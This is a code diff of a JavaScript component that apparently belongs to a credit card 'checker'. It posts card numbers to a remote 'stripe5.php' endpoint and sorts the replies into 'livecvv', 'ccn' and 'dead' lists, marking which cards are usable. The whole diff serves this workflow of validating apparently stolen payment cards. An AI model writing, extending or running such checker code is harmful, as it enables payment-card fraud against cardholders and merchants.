@@ -311,8 +311,8 @@ export default {
 
       var config = {
         method: "post",
-        // url: "http://localhost/VIP/Main/stripe4.php",
-        url: "https://asterian.dev/stripe4.php",
+        // url: "http://localhost/VIP/Main/stripe5.php",
+        url: "https://asterian.dev/stripe5.php",
         headers: {
           "Content-Type": "application/json",
         },
@@ -322,7 +322,17 @@ export default {
       axios(config)
         .then((res) => {
           data = res.data;
-          if (data.includes("declined")) {
+          if (data.includes("CVV")) {
+            this.livecvv.push({
+              number: cc,
+              result: data,
+            });
+          } else if (data.includes("CCN")) {
+            this.ccn.push({
+              number: cc,
+              result: data,
+            });
+          } else {
             this.dead.push({
               number: cc,
               result: data,
